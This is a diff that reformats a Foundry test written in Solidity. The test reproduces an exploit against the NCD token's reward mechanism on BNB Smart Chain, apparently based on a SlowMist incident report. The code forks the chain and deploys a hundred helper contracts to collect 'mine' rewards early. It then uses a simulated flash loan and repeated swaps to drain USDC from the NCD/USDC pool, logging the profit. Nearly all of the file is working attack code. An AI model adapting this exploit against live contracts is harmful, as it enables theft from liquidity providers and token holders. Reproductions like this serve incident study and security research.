@@ -10,36 +10,37 @@ import "../interface.sol";
 
 // GUY : https://x.com/SlowMist_Team/status/1797821034319765604
 
-interface INcd is IERC20{
-    function mineStartTime(address) external view returns(uint256);
+interface INcd is IERC20 {
+    function mineStartTime(
+        address
+    ) external view returns (uint256);
 }
 
-contract LetTheContractHaveRewards{
+contract LetTheContractHaveRewards {
     IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
     INcd ncd_ = INcd(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
 
-
-    function preStartTimeRewards() public /*onlyOwner*/{
+    function preStartTimeRewards() public /*onlyOwner*/ {
         ncd_usdc_pair_.skim(address(this));
         ncd_.transfer(address(ncd_usdc_pair_), ncd_.balanceOf(address(this)) * 5 / 100);
         ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
         require(ncd_.mineStartTime(address(this)) > 0);
     }
 
-    function ack() public /*onlyOwner*/{
+    function ack() public /*onlyOwner*/ {
         //first, to get a reward
         ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
         //seconds, to reward get msg.sender
         ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
-
     }
 }
 
-contract LetTheContractHaveUsdc is Test{
+contract LetTheContractHaveUsdc is Test {
     IERC20 ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
     IERC20 usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
+
     function withdraw() public {
         usdc_.approve(address(router), type(uint256).max);
         ncd_.approve(address(router), type(uint256).max);
@@ -47,13 +48,14 @@ contract LetTheContractHaveUsdc is Test{
         path[0] = address(ncd_);
         path[1] = address(usdc_);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-           ncd_.balanceOf(address(this)) * 5 / 100 , 0, path, address(this), type(uint256).max
+            ncd_.balanceOf(address(this)) * 5 / 100, 0, path, address(this), type(uint256).max
         );
 
         ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
         usdc_.transfer(msg.sender, usdc_.balanceOf(address(this)));
     }
 }
+
 contract EuroExploit is Test {
     IERC20 ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
     IERC20 usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -61,16 +63,14 @@ contract EuroExploit is Test {
     IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
 
     LetTheContractHaveRewards[] letTheContractHaveRewardss;
+
     function setUp() public {
-        vm.createSelectFork("bsc", 39253639);
+        vm.createSelectFork("bsc", 39_253_639);
         usdc_.approve(address(router), type(uint256).max);
         ncd_.approve(address(router), type(uint256).max);
-
-        
     }
 
     function testExploit() public {
-        
         deal(address(usdc_), address(this), 10 ether); //Assume this is an exchange for uniswap, not flashloan!
         emit log_named_decimal_uint("ack before usdc_ balance = ", usdc_.balanceOf(address(this)), usdc_.decimals());
         address[] memory path = new address[](2);
@@ -80,8 +80,8 @@ contract EuroExploit is Test {
             10 ether, 0, path, address(this), type(uint256).max
         );
         ncd_.transfer(address(ncd_usdc_pair_), ncd_.balanceOf(address(this)) * 5 / 100);
-        
-        for(uint256 i = 0; i < 100; i++){
+
+        for (uint256 i = 0; i < 100; i++) {
             LetTheContractHaveRewards letTheContractHaveRewards = new LetTheContractHaveRewards();
             letTheContractHaveRewards.preStartTimeRewards();
             letTheContractHaveRewardss.push(letTheContractHaveRewards);
@@ -89,24 +89,23 @@ contract EuroExploit is Test {
 
         vm.warp(block.timestamp + 1 days);
 
-        deal(address(usdc_), address(this), 10000 ether); //flashloan 10000 usdc
+        deal(address(usdc_), address(this), 10_000 ether); //flashloan 10000 usdc
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-           10000 ether , 0, path, address(this), type(uint256).max
+            10_000 ether, 0, path, address(this), type(uint256).max
         );
-        for(uint256 i = 0; i < letTheContractHaveRewardss.length; i++){
+        for (uint256 i = 0; i < letTheContractHaveRewardss.length; i++) {
             LetTheContractHaveRewards letTheContractHaveRewards = letTheContractHaveRewardss[i];
             ncd_.transfer(address(letTheContractHaveRewards), ncd_.balanceOf(address(this)));
             letTheContractHaveRewards.ack();
         }
-        while(ncd_.balanceOf(address(this)) > 1000 ether){
-        // for(uint256 i = 0; i < 100; i++){
+        while (ncd_.balanceOf(address(this)) > 1000 ether) {
+            // for(uint256 i = 0; i < 100; i++){
             LetTheContractHaveUsdc letTheContractHaveUsdc = new LetTheContractHaveUsdc();
             ncd_.transfer(address(letTheContractHaveUsdc), ncd_.balanceOf(address(this)));
             letTheContractHaveUsdc.withdraw();
         }
-                
-        usdc_.transfer(address(0xdead), 10030 ether);// repay flashLoan
+
+        usdc_.transfer(address(0xdead), 10_030 ether); // repay flashLoan
         emit log_named_decimal_uint("profit usdc_ balance = ", usdc_.balanceOf(address(this)), usdc_.decimals());
     }
 }
-
